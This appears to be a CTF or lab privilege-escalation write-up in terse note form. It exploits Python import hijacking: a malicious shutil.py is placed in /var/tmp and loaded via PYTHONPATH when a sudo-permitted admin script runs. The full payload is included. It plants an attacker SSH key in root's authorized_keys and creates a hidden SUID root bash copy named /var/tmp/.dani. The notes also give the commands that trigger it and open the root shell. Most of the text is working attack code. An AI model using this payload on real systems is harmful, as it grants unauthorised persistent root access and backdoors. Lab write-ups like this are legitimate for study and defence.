___

When a Python script calls `import`, it has a series of paths it checks for the module. I can see this with the `sys` module:

```bash
python3 -c "import sys; print('\n'.join(sys.path))"
```

```bash
echo $PYTHONPATH
```

```bash
export PYTHONPATH=/tmp
```

Two options, 

- Copy `/bin/bash` and set it owned by root and SUID.
- Write my public SSH key into `/root/.ssh/authorized_keys`.


```python
#!/usr/bin/python3

import os

os.system("mkdir -p /root/.ssh; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFFzFsH+WX95lqeCJkOp6cRZufRzw8pGqdoj1q4NL9LmPvtDCiGxsDb5D+vF6rXMrW0cqH3P4kYiTG8+RLrolGFTkR+V/2CXDmABQx5T640fCH77oiMF8U9uoKGS+ow5vA4Vq4QqKFsu+J9qn/sMbLCJ/      874tay6a1ryPJdtjj0SxTems1p2WgklYiZZKKscmYH4+dMtHMdQAKv3CTpWbSE7De4UvAUFvxiKS1yHLh8QF5L0YCUZ42pNtzZ4CHPRojxJZKbOHhTOJms4CLi3CXN/ZEpPijt0mJaGrxnA3oOkOFIscqoeXYFybTs82KzKqwwP4Y6ACWJwk1Dqrv37I/L+9YU/8Rv5b+r0/c1p9lZ1pnnjRt46g/              kocnY3AZxcbmDUHx5wAlsNwK8s5Aw+IOicBYCOIv2KyXUT61/lW2iUTBIiMh0yrqehLfJ7HS3pSycQnWdVPoRbmCfvuJqQGyaJMu+ceqYqpwHEBoUlIjKnSHF30aHKL5ALFREEo1FCc= root@kali' >> /root/.ssh/authorized_keys")
os.system('cp /bin/bash /var/tmp/.dani; chown root:root /var/tmp/.dani; chmod 4755 /var/tmp/.dani')
```

This script uses `os.system` to do each of the things described above. The first calls `mkdir -p` which will create the directory if it doesn’t exist, and happily return and continue if it does. Then it uses `echo` to append my key to `authorized_keys`.

The second simply copies `/bin/bash` to `/var/tmp/.dani, sets the owner as root, and sets the permissions to SUID.


```bash
./.dani -p
```
# Example 

```python
from shutil import make_archive
```

create shutil.py on /var/tmp

```bash
sudo PYTHONPATH=/var/tmp /opt/scripts/admin_tasks.sh 6
```
